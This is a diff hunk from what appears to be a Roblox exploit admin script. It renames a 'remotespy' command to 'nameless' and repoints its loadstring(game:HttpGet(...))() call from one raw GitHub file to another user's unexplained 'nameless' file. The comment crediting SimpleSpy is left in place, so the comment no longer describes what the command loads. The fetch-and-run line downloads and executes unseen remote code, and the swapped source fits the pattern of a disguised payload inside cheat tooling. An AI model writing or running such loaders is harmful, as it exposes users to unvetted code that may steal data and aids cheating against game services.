@@ -10227,11 +10227,11 @@ addcmd('olddex', {'odex'}, function(args, speaker)
 	Load(Dex)
 end)
 
-addcmd('remotespy',{'rspy'},function(args, speaker)
+addcmd('nameless',{'n'},function(args, speaker)
 	notify("Loading",'Hold on a sec')
 	-- Full credit to exx, creator of SimpleSpy
 	-- also thanks to NoobSploit for fixing
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/raditself/d/main/simplespy"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Xitself/b/refs/heads/main/nameless"))()
 end)
 
 addcmd('xx',{'alogger'},function(args, speaker)
